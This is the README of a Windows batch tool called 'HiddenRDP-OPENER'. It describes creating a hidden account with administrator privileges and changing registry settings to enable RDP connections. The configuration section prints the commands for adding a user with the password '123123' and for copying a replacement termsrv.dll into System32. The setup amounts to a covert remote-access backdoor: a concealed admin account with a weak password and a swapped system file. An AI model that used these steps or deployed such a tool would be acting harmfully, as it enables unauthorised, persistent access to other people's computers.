# HiddenRDP-OPENER
This script make any windows compatible with RDP connection 

<h2>Requirements :</h2>
Windows 7 , Windows 8 , Windows 10 / Not tested yet in Windows XP

<h2>How it works ?:</h2>
This script create a hidden profil ( Administrator privilege ) and change registry parametre to make windows compatible with RDP Connection.

<h2>Configuration:</h2>
You need to open RDPScript.bat
And make this changes :
net user hidden 123123 /ADD
hidden = name of your created account
123123 = password of your account
xcopy "termsrv.dll" "%windir%\System32\" /s /h /q
change termsrv.dll with your full path , ex : C:\Users\comix\Downloads\termsrv.dll

<h2>License</h2>

Copyright © 2015 Soufiyan Ak (Comix)
